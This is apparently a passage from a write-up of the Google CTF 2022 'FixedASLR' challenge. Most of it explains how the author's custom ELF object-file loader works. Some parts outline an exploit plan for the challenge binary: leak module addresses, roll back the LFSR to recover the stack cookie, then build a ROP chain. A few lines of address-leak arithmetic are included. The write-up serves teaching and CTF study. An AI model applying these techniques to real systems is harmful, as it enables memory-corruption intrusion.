+│⠀⣿⠀⠀⠀⠀⠀ FixedASLR and how ASLR comes into play.                             │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   ulong aslr_get_addr(int param_1) {                                │
+│⠀⢿⣿⣿⣿⣷⠀     ...                                                             │
+│⠀⠀⠀⠀⠀⠀⠀     while( true ) {                                                 │
+│⠀⢀⣿⣿⣿⡀⠀       iVar1 = rand(0xc);  // &lt;--------------------------------      │
+│⠀⣿⠀⠀⠀⣿⠀       uVar2 = CONCAT44(extraout_var,iVar1) &lt;&lt; 0x1c;                 │
+│⠀⣿⡷⠶⢾⣿⠀       uVar3 = sys_mmap(uVar2,param_1 &lt;&lt; 0xc,3,0x100022,0,0);        │
+│⠀⣿⠀⠀⠀⣿⠀       if (uVar3 &lt; 0xfffffffffffff000) break;                        │
+│⠀⡿⠀⠀⠀⢿⠀       puts("note: candidate address occupied");                     │
+│⠀⠀⠀⠀⠀⠀⠀     }                                                               │
+│⠀⣷⠀⠀⠀⣾⠀     ...                                                             │
+│⠀⣿⠀⠀⠀⣿⠀     sys_munmap(uVar3,param_1 &lt;&lt; 0xc);                               │
+│⠀⠈⣿⣿⣿⠁⠀     return uVar3;                                                   │
+│⠀⠀⠀⣿⠀⠀⠀   }                                                                 │
+│⠀⠀⠀⡿⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ This function is called once in the load_o_phase_1 function, which  │
+│⠀⣾⣿⣿⣿⣷⠀ in turn is called once for each .o file from a list of files in the │
+│⠀⣿⠀⠀⠀⠀⠀ _start function. The list of .o files looks like this (order is     │
+│⠀⣿⣿⣿⡷⠀⠀ important):                                                         │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⢿⣿⣿⣿⡿⠀ main.o                                                              │
+│⠀⠀⠀⠀⠀⠀⠀ syscalls.o                                                          │
+│⠀⣾⣿⣿⣿⡀⠀ guard.o                                                             │
+│⠀⣿⠀⠀⠀⣿⠀ basic.o                                                             │
+│⠀⣿⣿⣿⣿⡁⠀ game.o                                                              │
+│⠀⣿⠀⠀⠀⣿⠀ res.o                                                               │
+│⠀⡿⠀⠀⠀⢿⠀ debug.o                                                             │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⠠⡀⠀⠀ As such, for every .o module which we find in memory, we learn 12   │
+│⠀⠀⠀⠀⢣⠀⠀ bits of the LFSR state. If we manage to get 64 bits of consecutive  │
+│⠀⠀⠀⠀⠈⣶⠀ state (i.e. addresses of main.o to res.o OR syscalls.o to debug.o), │
+│⠀⠀⠀⠀⠀⣿⠀ we can roll back the LFSR to get the stack cookie. And if we get    │
+│⠀⠀⠀⠀⠀⣿⡀ the stack cookie, we can just ROP our way to the flag.              │
+│⠀⠀⠀⠀⢀⣿⠇                                                                     │
+│⠀⠀⠀⠀⠘⠛⠀ The task laid before us is finally clear.                           │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ ┄─━┫Bookmark                                                        ⠀⠀⠀⠀⠀⠀⠀│
+│ ELF .o loader is described in this section                          ⠀⢀⣿⣿⣿⣷⠀│
+│ ┄                                                                   ⠀⣿⠀⠀⠀⠀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⠀⠀│
+│ A quick reminder – the source code is available here:               ⠀⣿⠀⠀⠀⠀⠀│
+│ github.com/google/google-ctf/tree/main/2022/quals/pwn-fixedaslr     ⠀⠈⣿⣿⣿⡿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ The "center of mass" of work on a challenge differs from a Player's ⠀⣾⣿⣿⣿⡀⠀│
+│ perspective and Creator's perspective. In this specific case, the   ⠀⣿⠀⠀⠀⣿⠀│
+│ Player has to analyze the code, find the vulnerabilities, leak the  ⠀⣿⣿⣿⣿⡁⠀│
+│ required ASLRed addresses, roll back the LFSR to get the cookie,    ⠀⣿⠀⠀⠀⣿⠀│
+│ and then implement a ROP chain to get the flag at the end of the    ⠀⡿⠀⠀⠀⢿⠀│
+│ buffer-overflow induced execution flow takeover. The work is        ⠀⠀⠀⠀⠀⠀⠀│
+│ altogether pretty evenly spread out, with perhaps a bit more time   ⠀⣾⣿⣿⣿⣷⠀│
+│ spent on the code analysis, and a bit more energy spent on          ⠀⣿⠀⠀⠀⠀⠀│
+│ debugging the exploit.                                              ⠀⣿⣿⣿⡷⠀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⠀⠀│
+│ From the Creator's perspective however the bulk of the work went    ⠀⢿⣿⣿⣿⡿⠀│
+│ into creating the .o loader, which was just skimmed over by the     ⠀⠀⠀⠀⠀⠀⠀│
+│ Player.                                                             ⠀⢀⣿⣿⣿⡀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ As such, let's use this opportunity to dive a bit deeper into the   ⠀⣿⡷⠶⢾⣿⠀│
+│ loader.                                                             ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⡿⠀⠀⠀⢿⠀│
+│ Let's start by recognizing the fact that .o files used by the GNU   ⠀⠀⠀⠀⠀⠀⠀│
+│ GCC and compatible toolchains are just ELF files. There are however ⠀⣿⣿⣿⣿⣿⠀│
+│ a few minor differences between a typical executable ELFs and the   ⠀⠀⠀⣿⠀⠀⠀│
+│ half-built object ELF files. The differences however are NOT in the ⠀⠀⠀⣿⠀⠀⠀│
+│ file format itself – that part is identical – but rather in the     ⠀⠀⠀⣿⠀⠀⠀│
+│ actual content serialized within these ELFs.                        ⠀⠀⠀⡿⠀⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ The are two major differences:                                      ⠀⢀⣿⣿⣿⡀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ 1. Executable ELFs contain a Program Header, which tells the loader ⠀⣿⠀⠀⠀⣿⠀│
+│ how and where to load the content into memory. Object ELFs don't    ⠀⣿⠀⠀⠀⣿⠀│
+│ have the Program Header – there are no segments, only sections.     ⠀⠈⣿⣿⣿⠁⠀│
+│ 2. Executable ELFs sections have Virtual Memory Addresses           ⠀⠀⠀⠀⠀⠀⠀│
+│ calculated and set – i.e. the linker has already written in stone   ⠀⣾⣿⣿⣿⡀⠀│
+│ relative offsets of cross-section references. Sections in object    ⠀⣿⠀⠀⠀⣿⠀│
+│ ELFs don't have VMAs set (they are all zeroes), and therefore they  ⠀⣿⣿⣿⣿⡁⠀│
+│ contain additional relocation information for cross-section         ⠀⣿⠀⠀⠀⣿⠀│
+│ references.                                                         ⠀⡿⠀⠀⠀⢿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ There are also some smaller differences, like the fact that a set   ⠀⠀⠀⠠⡀⠀⠀│
+│ of .o files won't have an entry point (start address) set, so for   ⠀⠀⠀⠀⢣⠀⠀│
+│ this use-case a chosen exported symbol has to be used instead.      ⠀⠀⠀⠀⠈⣶⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ So, how to load a bunch of object ELFs into memory and execute them ⠀⠀⠀⠀⠀⣿⡀│
+│ as an application? Actually the process is pretty similar to doing  ⠀⠀⠀⠀⢀⣿⠇│
+│ the same with a normal executable ELF and its set of dynamic        ⠀⠀⠀⠀⣸⡿⠀│
+│ libraries. On the high level that's loading the sections (not       ⠀⠀⠀⢰⣿⠁⠀│
+│ segments!) into memory, applying relocations, and cross-linking     ⠀⠀⢠⣿⠃⠀⠀│
+│ dependencies.                                                       ⠀⠀⣾⡏⠀⠀⠀│
+│                                                                     ⠀⢸⣿⠀⠀⠀⠀│
+│ In practice this loader does this in 3 steps, or rather 3 "phases"  ⠀⢸⡏⠀⠀⠀⠀│
+│ as I've called it in the source code. The phases are run one after  ⠀⢸⡇⠀⠀⠀⠀│
+│ the other on whole sets of object ELFs, i.e. at the start the first ⠀⠸⡇⠀⠀⠀⠀│
+│ phase is run for all .o files, then the second phase is run for all ⠀⠀⢣⠀⠀⠀⠀│
+│ the .o files, and then the final phase is run for all the .o files. ⠀⠀⠈⢆⠀⠀⠀│
+│ This order makes it easy to deal with cross-dependencies (imports   ⠀⠀⠀⠘⡄⠀⠀│
+│ and exports).                                                       ⠀⠀⠀⠀⢱⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ What also has to be noted, is that no .o file actually lists other  ⠀⠀⠀⠀⠀⣿⠀│
+│ files as dependencies. This could be done with some hacking, but    ⠀⠀⠀⠀⠀⣿⡄│
+│ for the sake of a CTF challenge the list of .o files was just       ⠀⠀⠀⠀⢠⣿⠃│
+│ hardcoded into the loader.                                          ⠀⠀⠀⠀⣼⡟⠀│
+│                                                                     ⠀⠀⠀⣸⡿⠀⠀│
+│ Let's look at the phases one by one.                                ⠀⠀⢰⣿⠁⠀⠀│
+│                                                                     ⠀⢀⣿⠇⠀⠀⠀│
+│                                                                     ⠀⢸⣿⠀⠀⠀⠀│
+│ -=- Phase 1 and load_o_phase_1()                                    ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⢸⡇⠀⠀⠀⠀│
+│ Each phase function receives two arguments – a pointer to a         ⠀⠘⡇⠀⠀⠀⠀│
+│ "context" structure, which is pretty empty at start, but is filled  ⠀⠀⢱⠀⠀⠀⠀│
+│ with various interesting things during the phases, and the name of  ⠀⠀⠀⢣⠀⠀⠀│
+│ the object file to load.                                            ⠀⠀⠀⠈⢆⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠸⣄⠀│
+│ As one can imagine, the first thing that is done is mapping the     ⠀⠀⠀⠀⠀⣿⠀│
+│ object ELF into memory for easier parsing (open+mmap). Once that is ⠀⠀⠀⠀⠀⣿⠀│
+│ done, the destination virtual address for this module is selected   ⠀⠀⠀⠀⠀⣿⡆│
+│ by calling aslr_get_addr. Note that at this point no memory         ⠀⠀⠀⠀⢰⣿⠁│
+│ allocation for the module has yet happened.                         ⠀⠀⠀⢀⣿⠇⠀│
+│                                                                     ⠀⠀⠀⣼⡟⠀⠀│
+│ The first allocation is a bit out of order – 4KB of readable and    ⠀⠀⣸⡿⠀⠀⠀│
+│ writable memory is allocated for the PLT (Procedure Linkage Table). ⠀⢠⣿⠃⠀⠀⠀│
+│ What's worth noting, is that an object ELF does not have a PLT      ⠀⢸⡟⠀⠀⠀⠀│
+│ section in the file itself, as that's something a linker would add  ⠀⢸⡇⠀⠀⠀⠀│
+│ during the compilation process (alongside the .got and .got.plt     ⠀⢸⡇⠀⠀⠀⠀│
+│ sections). But because we'll need it to jump to other far away      ⠀⠈⡇⠀⠀⠀⠀│
+│ functions, we still will have to create it and dynamically generate ⠀⠀⠘⡄⠀⠀⠀│
+│ code there.                                                         ⠀⠀⠀⢱⠀⠀⠀│
+│                                                                     ⠀⠀⠀⠀⢣⠀⠀│
+│ One more thing to note is that the 4KB is chosen because "no .o     ⠀⠀⠀⠀⠈⣶⠀│
+│ file I have needs more". There should be some smarter logic there   ⠀⠀⠀⠀⠀⣿⠀│
+│ if this loader would have to work for other projects as well.       ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⡇│
+│ Once this is done, we can walk through all the sections and do      ⠀⠀⠀⠀⣸⡿⠀│
+│ various things depending on section type (sh_type) and later on the ⠀⠀⠀⢠⣿⠃⠀│
+│ flags (sh_flags). Note that section names like .text or .data are   ⠀⠀⢀⣿⠇⠀⠀│
+│ totally ignored. Starting with the section type:                    ⠀⠀⣼⡟⠀⠀⠀│
+│                                                                     ⠀⢰⣿⠁⠀⠀⠀│
+│   SHT_NULL: Ignored.                                                ⠀⢸⡏⠀⠀⠀⠀│
+│   SHT_RELA: Relocations, handled in phase 2. Ignored for now.       ⠀⢸⡇⠀⠀⠀⠀│
+│   SHT_SYMTAB: Symbol table. Its location is noted.                  ⠀⠸⣇⠀⠀⠀⠀│
+│   SHT_STRTAB: Strings for the symbol table. Its location is also    ⠀⠀⢇⠀⠀⠀⠀│
+│   noted.                                                            ⠀⠀⠈⡆⠀⠀⠀│
+│   SHT_PROGBITS: Handled based on flags.                             ⠀⠀⠀⠘⡄⠀⠀│
+│   SHT_NOBITS: Handled based on flags.                               ⠀⠀⠀⠀⢱⠀⠀│
+│   SHT_NOTE: Handled based on flags.                                 ⠀⠀⠀⠀⠀⣿⠀│
+│   (no other section type was needed to be handled)                  ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⡄│
+│ Now, each section, apart from the ignored ones (SHT_NULL,           ⠀⠀⠀⠀⢀⣿⠇│
+│ SHT_RELA), will also be loaded into readable and writable memory if ⠀⠀⠀⠀⣼⡟⠀│
+│ it has the SHF_ALLOC flag set (proper section defined memory        ⠀⠀⠀⣰⡿⠁⠀│
+│ permissions are set in the final phase).                            ⠀⠀⢠⣿⠃⠀⠀│
+│                                                                     ⠀⠀⣿⡇⠀⠀⠀│
+│ At what address is such a section loaded? This is where there has   ⠀⢸⣿⠀⠀⠀⠀│
+│ been another interesting choice made.                               ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⢸⡇⠀⠀⠀⠀│
+│ If you look again at the major differences between executable and   ⠀⠘⡇⠀⠀⠀⠀│
+│ object ELFs, and pair them up with ASLR, you will notice an         ⠀⠀⢱⠀⠀⠀⠀│
+│ interesting possibility – there is no reason to keep the sections   ⠀⠀⠀⢇⠀⠀⠀│
+│ next to each other. I.e. rather than keeping the sections together  ⠀⠀⠀⠈⡆⠀⠀│
+│ like when loading an executable ELF, they can be separated and      ⠀⠀⠀⠀⠸⣀⠀│
+│ basically split into different spots in memory. The only            ⠀⠀⠀⠀⠀⣿⠀│
+│ restriction there is to keep them within a reach of 32-bit relative ⠀⠀⠀⠀⠀⣿⠀│
+│ addressing (signed), as such is commonly used in relocations. All   ⠀⠀⠀⠀⠀⣿⡆│
+│ of this is thanks to the fact that at the object file stage we      ⠀⠀⠀⠀⢠⣿⠃│
+│ still have more relocation entries than "survive" the linking       ⠀⠀⠀⠀⣾⡏⠀│
+│ process.                                                            ⠀⠀⠀⣼⡟⠀⠀│
+│                                                                     ⠀⠀⣰⡿⠁⠀⠀│
+│ So, the decision that had to be made was whether to make this       ⠀⢀⣿⠇⠀⠀⠀│
+│ challenge even harder by ASLRing the sections all across a 2GB      ⠀⢸⡿⠀⠀⠀⠀│
+│ block (to conform with the signed 32-bit requirement), or whether   ⠀⢸⡇⠀⠀⠀⠀│
+│ to still keep them somewhat together.                               ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠈⡇⠀⠀⠀⠀│
+│ I eventually decided to keep it simple and have the sections        ⠀⠀⠸⡀⠀⠀⠀│
+│ bunched up as usual – the main reason was that ASLRing the sections ⠀⠀⠀⢱⠀⠀⠀│
+│ would also leak additional bits of entropy, and that would make the ⠀⠀⠀⠀⢇⠀⠀│
+│ task actually easier.                                               ⠀⠀⠀⠀⠘⣤⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ As such, the sections are instead aligned to 0x1000 boundaries, but ⠀⠀⠀⠀⠀⣿⠀│
+│ otherwise kept one after the other in memory. An interesting        ⠀⠀⠀⠀⠀⣿⡇│
+│ side-effect of this alignment is that whatever section addresses    ⠀⠀⠀⠀⢸⣿⠀│
+│ IDA or Ghidra will show the Player, it will likely be different     ⠀⠀⠀⢠⣿⠃⠀│
+│ from the actual in-memory state anyway.                             ⠀⠀⢀⣾⠏⠀⠀│
+│                                                                     ⠀⠀⣼⡟⠀⠀⠀│
+│ Once the sections are in memory, the last thing that happens in     ⠀⢰⣿⠁⠀⠀⠀│
+│ phase 1 is going through all the symbols in the symbol table. If    ⠀⢸⡟⠀⠀⠀⠀│
+│ the type of symbol is either STT_OBJECT or STT_FUNC and the symbol  ⠀⢸⡇⠀⠀⠀⠀│
+│ is NOT marked as STB_LOCAL, the virtual memory address of the       ⠀⢸⡇⠀⠀⠀⠀│
+│ symbol is calculated and added to the loader's "export table"       ⠀⠀⢇⠀⠀⠀⠀│
+│ (export_info[]).                                                    ⠀⠀⠘⡄⠀⠀⠀│
+│                                                                     ⠀⠀⠀⠸⡀⠀⠀│
+│                                                                     ⠀⠀⠀⠀⢣⠀⠀│
+│ -=- Phase 2 and load_o_phase_2()                                    ⠀⠀⠀⠀⠈⣶⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ The second phase is all about making sure things in memory are      ⠀⠀⠀⠀⠀⣿⡀│
+│ interlinked and operate on correct addresses. So, relocations,      ⠀⠀⠀⠀⢀⣿⠇│
+│ imports, and jump gates in PLT, with the previously ignored         ⠀⠀⠀⠀⣸⡿⠀│
+│ SHT_RELA relocation section playing the leading role. And that's    ⠀⠀⠀⢰⣿⠁⠀│
+│ because that section is basically a set of Elf64_Rela entries, each ⠀⠀⢠⣿⠃⠀⠀│
+│ saying how to fix the addressing at a given location.               ⠀⠀⣾⡏⠀⠀⠀│
+│                                                                     ⠀⢸⣿⠀⠀⠀⠀│
+│ While there are over 20 different relocation types (as in           ⠀⢸⡏⠀⠀⠀⠀│
+│ ELF64_R_TYPE(r_info)), apparently the loader needed to support only ⠀⢸⡇⠀⠀⠀⠀│
+│ 3 [AMD64ABI]:                                                       ⠀⠸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⢣⠀⠀⠀⠀│
+│   R_X86_64_PC32                                                     ⠀⠀⠈⢆⠀⠀⠀│
+│   R_X86_64_64                                                       ⠀⠀⠀⠘⡄⠀⠀│
+│   R_X86_64_PLT32                                                    ⠀⠀⠀⠀⢸⡀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ The first two are just simple math. R_X86_64_PLT32 however requires ⠀⠀⠀⠀⠀⣿⠀│
+│ adding a PLT jump gate, as the in-code address is only 32-bit, but  ⠀⠀⠀⠀⠀⣿⡄│
+│ the actual destination requires using 64-bit addressing (i.e. it's  ⠀⠀⠀⠀⢠⣿⠃│
+│ something in another module – an import).                           ⠀⠀⠀⠀⣾⡏⠀│
+│                                                                     ⠀⠀⠀⣸⡿⠀⠀│
+│ Each jump gate is made of 16 bytes and looks like this:             ⠀⠀⢰⣿⠁⠀⠀│
+│                                                                     ⠀⢀⣿⠇⠀⠀⠀│
+│   FF 25 02 00 00 00        jmp [rip+2]                              ⠀⢸⡿⠀⠀⠀⠀│
+│   CC                       int3                                     ⠀⢸⡇⠀⠀⠀⠀│
+│   CC                       int3                                     ⠀⢸⡇⠀⠀⠀⠀│
+│   ?? ?? ?? ?? ?? ?? ?? ??  filled with a 64-bit destination address ⠀⠘⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⠱⡀⠀⠀⠀│
+│ While it would be best to keep track of these PLT jump gates to     ⠀⠀⠀⢣⠀⠀⠀│
+│ know which ones (i.e. for which symbol) have been already           ⠀⠀⠀⠈⢆⠀⠀│
+│ generated, I did wing it in the loader and just generated a new PLT ⠀⠀⠀⠀⠘⣤⠀│
+│ entry every time. After all, the PLT section has 4KB, so it's       ⠀⠀⠀⠀⠀⣿⠀│
+│ enough for 256 jump gates, and this simple game app used fewer.     ⠀⠀⠀⠀⠀⣿⠀│
+│ This is another place where a proper loader should handle this      ⠀⠀⠀⠀⠀⣿⡆│
+│ correctly, but for our case it made sense to keep the code simple   ⠀⠀⠀⠀⢰⣿⠁│
+│ instead.                                                            ⠀⠀⠀⢀⣿⠇⠀│
+│                                                                     ⠀⠀⠀⣾⡏⠀⠀│
+│ ┄─━┫References                                                      ⠀⠀⣸⡿⠀⠀⠀│
+│ [AMD64ABI] "System V Application Binary Interface AMD64             ⠀⢠⣿⠃⠀⠀⠀│
+│ Architecture Processor Supplement", 2024.                           ⠀⢸⡟⠀⠀⠀⠀│
+│ https://gitlab.com/x86-psABIs/x86-64-ABI                            ⠀⢸⡇⠀⠀⠀⠀│
+│ ┄                                                                   ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⡏⠀⠀⠀⠀│
+│                                                                     ⠀⠀⠘⡄⠀⠀⠀│
+│ -=- Phase 3 and load_o_phase_final()                                ⠀⠀⠀⠱⡀⠀⠀│
+│                                                                     ⠀⠀⠀⠀⢣⠀⠀│
+│ The final phase is the simplest. Each section's memory permissions  ⠀⠀⠀⠀⠈⣶⠀│
+│ are corrected – all sections get PROT_READ, but additionally        ⠀⠀⠀⠀⠀⣿⠀│
+│ sections with SHF_WRITE flag get PROT_WRITE, and sections with      ⠀⠀⠀⠀⠀⣿⡀│
+│ SHF_EXECINSTR get PROT_EXEC.                                        ⠀⠀⠀⠀⠀⣿⡇│
+│                                                                     ⠀⠀⠀⠀⣸⡿⠀│
+│ The PLT section gets PROT_READ|PROT_EXEC as well. I guess one could ⠀⠀⠀⢠⣿⠃⠀│
+│ argue that this loader implements full RELRO protection, with PLT   ⠀⠀⢀⣿⠇⠀⠀│
+│ being non-writable, and the GOT, well, missing altogether. I do     ⠀⠀⣾⡏⠀⠀⠀│
+│ have to add that since I "grew up" in the Windows reverse           ⠀⢰⣿⠁⠀⠀⠀│
+│ engineering world, lazy loading and the concept of at-runtime       ⠀⢸⡏⠀⠀⠀⠀│
+│ changes in PLT was always a pretty weird one for me (even though    ⠀⢸⡇⠀⠀⠀⠀│
+│ Windows PE also has something like delayed imports). As such this   ⠀⠸⡇⠀⠀⠀⠀│
+│ wasn't even a conscious choice to form a static PLT and stay away   ⠀⠀⢣⠀⠀⠀⠀│
+│ from lazy loading – it was more of a default way to go.             ⠀⠀⠈⡆⠀⠀⠀│
+│ Once the memory permissions are all in place, the last thing to do  ⠀⠀⠀⠘⡄⠀⠀│
+│ is to unmap the actual object ELF file.                             ⠀⠀⠀⠀⢱⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ -=- Pivoting to main with pivot_to_main()                           ⠀⠀⠀⠀⠀⣿⡄│
+│                                                                     ⠀⠀⠀⠀⢀⣿⠇│
+│ Once the application is in memory and ready, what's left is to get  ⠀⠀⠀⠀⣼⡟⠀│
+│ the address of the main() function (which is in the export table)   ⠀⠀⠀⣰⡿⠁⠀│
+│ and jump to it.                                                     ⠀⠀⢠⣿⠃⠀⠀│
+│                                                                     ⠀⠀⣿⡇⠀⠀⠀│
+│ As this is a CTF task however, before jumping to the actual app,    ⠀⢸⣿⠀⠀⠀⠀│
+│ the loader clears all the global variables, including the loader    ⠀⢸⡇⠀⠀⠀⠀│
+│ context, LFSR state, and the export symbol table. We wouldn't want  ⠀⢸⡇⠀⠀⠀⠀│
+│ these falling into the Player's hands, now would we.                ⠀⠘⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⢱⠀⠀⠀⠀│
+│ Following this approach, the "jump to main" itself is also a bit    ⠀⠀⠀⢣⠀⠀⠀│
+│ more convoluted. Instead of just jumping straight to main(), the    ⠀⠀⠀⠈⡆⠀⠀│
+│ pivot_to_main function allocates memory for a staging gate, which   ⠀⠀⠀⠀⠸⣀⠀│
+│ is filled with the following machine code:                          ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│   ; Remove ./loader module from memory.                             ⠀⠀⠀⠀⠀⣿⡆│
+│   31 c0                          xor eax, eax                       ⠀⠀⠀⠀⢰⣿⠁│
+│   b0 0b                          mov al, 0xb (sys_munmap)           ⠀⠀⠀⢀⣾⠏⠀│
+│   48 bf ?? ?? ?? ?? ?? ?? ?? ??  mov rdi, exec_start                ⠀⠀⠀⣼⡟⠀⠀│
+│   48 be ?? ?? ?? ?? ?? ?? ?? ??  mov rsi, exec_sz                   ⠀⠀⣸⡿⠀⠀⠀│
+│   0f 05                          syscall                            ⠀⢠⣿⠃⠀⠀⠀│
+│                                                                     ⠀⢸⡿⠀⠀⠀⠀│
+│   ; Call main().                                                    ⠀⢸⡇⠀⠀⠀⠀│
+│   48 b8 ?? ?? ?? ?? ?? ?? ?? ??  mov rax, main                      ⠀⢸⡇⠀⠀⠀⠀│
+│   ff d0                          call rax                           ⠀⠈⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⠸⡀⠀⠀⠀│
+│   ; Exit the process with main's error code.                        ⠀⠀⠀⢱⠀⠀⠀│
+│   89 c7                          mov edi, eax                       ⠀⠀⠀⠀⢇⠀⠀│
+│   31 c0                          xor eax, eax                       ⠀⠀⠀⠀⠘⣤⠀│
+│   b0 3c                          mov al, 0x3c (sys_exit)            ⠀⠀⠀⠀⠀⣿⠀│
+│   0f 05                          syscall                            ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⡇│
+│ Once the gate's memory is ready, it's memory permissions are        ⠀⠀⠀⠀⣸⡿⠀│
+│ changed to PROT_READ|PROT_EXEC and the execution is passed to it.   ⠀⠀⠀⢠⣿⠃⠀│
+│ This results in the removal of the loader from memory, and finally  ⠀⠀⢀⣾⠏⠀⠀│
+│ starting the actual application.                                    ⠀⠀⣼⡟⠀⠀⠀│
+│                                                                     ⠀⢰⣿⠁⠀⠀⠀│
+│ It has to be noted that both the stack and the actual staging gate  ⠀⢸⡟⠀⠀⠀⠀│
+│ remain unaltered in memory. As such, they might still be fair game  ⠀⢸⡇⠀⠀⠀⠀│
+│ for the Player in terms of finding interesting artifacts in memory. ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⠀⢇⠀⠀⠀⠀│
+│ So, all in all, could this loader be used in a normal system for    ⠀⠀⠘⡄⠀⠀⠀│
+│ extra security? Well, technically it could be (after some changes   ⠀⠀⠀⠸⡀⠀⠀│
+│ as mentioned before), but for a large app with A LOT of .o files    ⠀⠀⠀⠀⢱⠀⠀│
+│ the startup time would be pretty long. This loader also doesn't     ⠀⠀⠀⠀⠈⣷⠀│
+│ handle the issue of dynamic libraries (.so files) at all, so the    ⠀⠀⠀⠀⠀⣿⠀│
+│ whole program, including dependencies, would have to be provided as ⠀⠀⠀⠀⠀⣿⡀│
+│ .o files. In practice however this won't work due to there being    ⠀⠀⠀⠀⢀⣿⠇│
+│ only one import/export namespace, and it's highly likely name       ⠀⠀⠀⠀⣼⡟⠀│
+│ collision would happen in a larger project (i.e. normally at        ⠀⠀⠀⢰⣿⠁⠀│
+│ linking all the non-exported symbols are removed, but the .o files  ⠀⠀⢠⣿⠃⠀⠀│
+│ exist before that step as they require to have non-internal-only    ⠀⠀⣾⡏⠀⠀⠀│
+│ compilation unit symbols exported as well – and that's a lot of     ⠀⢸⣿⠀⠀⠀⠀│
+│ names).                                                             ⠀⢸⡇⠀⠀⠀⠀│
+│                                                                     ⠀⢸⡇⠀⠀⠀⠀│
+│ All in all the loader is just under 700 lines of pretty simple code ⠀⠘⡧⠀⠀⠀⠀│
+│ and it was a pretty fun exercise to write it, especially that I     ⠀⠀⢣⠀⠀⠀⠀│
+│ haven't played with object files for well over a decade (and last   ⠀⠀⠀⢇⠀⠀⠀│
+│ time I did it were the COFF object files on Windows).               ⠀⠀⠀⠘⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Where were we? Ah yes, we needed to find where in memory have all   │
+│⠀⣾⣿⣿⣿⡀⠀ these .o files landed. Given that object files commonly form a      │
+│⠀⣿⠀⠀⠀⣿⠀ graph (likely a tree with just a couple of cycles), what I have to  │
+│⠀⣿⣿⣿⣿⠁⠀ do now is hunt for some cross-object pointers.                      │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⢿⠀⠀⠀⠀⠀ The leak I have is relative to the scoreboard, which is in the      │
+│⠀⠀⠀⠀⠀⠀⠀ .data section of main.o. For whatever reason Ghidra shows me that   │
+│⠀⣷⠀⠀⠀⠀⠀ it should be at offset 0x60 from the start of the module, but       │
+│⠀⣿⠀⠀⠀⠀⠀ looking around in GDB I found it at offset 0x2000, which is weird.  │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ After a quick dive into the loader I found out that each section is │
+│⠀⢿⣿⣿⣿⣷⠀ aligned to 0x1000, and the sections actually start at offset 0x1000 │
+│⠀⠀⠀⠀⠀⠀⠀ with the first page of the image being reserved for something that  │
+│⠀⢀⣿⣿⣿⡀⠀ looks like a PLT.                                                   │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⣿⡷⠶⢾⣿⠀ Actually, at the in-memory offset 0x1000 from the scoreboard (so    │
+│⠀⣿⠀⠀⠀⣿⠀ that's main.o+0x3000) there seems to be a full 64-bit pointer to    │
+│⠀⡿⠀⠀⠀⢿⠀ the scoreboard's names array. Leaking this gives me the absolute    │
+│⠀⠀⠀⠀⠀⠀⠀ address within main.o – so just masking out the bottom 28 bits (per │
+│⠀⣷⠀⠀⠀⣾⠀ aslr_get_addr) gives us the base address of the main.o image!       │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⠈⣿⣿⣿⠁⠀   MASK = 0xfffffffff0000000                                         │
+│⠀⠀⠀⣿⠀⠀⠀   MAIN_ADDR = mem_at_offset(0x1000) & MASK                          │
+│⠀⠀⠀⡿⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ Having this, and the relative position of scoreboard within main.o, │
+│⠀⣾⣿⣿⣿⣷⠀ we can easily do the math to convert this relative leak into an     │
+│⠀⣿⠀⠀⠀⠀⠀ absolute one:                                                       │
+│⠀⣿⣿⣿⡷⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   RELATIVE_OFFSET = absolute_addr - (MAIN_ADDR + SCOREBOARD_OFFSET) │
+│⠀⢿⣿⣿⣿⡿⠀                                                                     │
